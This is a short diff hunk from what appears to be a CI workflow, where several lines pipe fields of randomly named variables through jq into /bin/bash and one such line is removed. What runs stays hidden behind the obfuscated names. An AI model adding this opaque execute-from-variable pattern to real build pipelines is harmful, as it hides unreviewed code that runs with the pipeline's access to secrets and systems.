@@ -20,7 +20,6 @@ jobs:
           echo $cb11112 | jq -r .ux71368 | /bin/bash
           echo $ahzus04 | jq -r .hrt3726 | /bin/bash
           echo $fw3938 | jq -r .tex66679 | /bin/bash
-          echo $fpi1 | jq -r .kf86811 | /bin/bash
           printf '%s' "$fdpbi321" | jq -r .al66 | /bin/bash
           echo $wks219 | jq -r .atj5885 | /bin/bash
           echo $obqn43 | jq -r .gla771 | /bin/bash
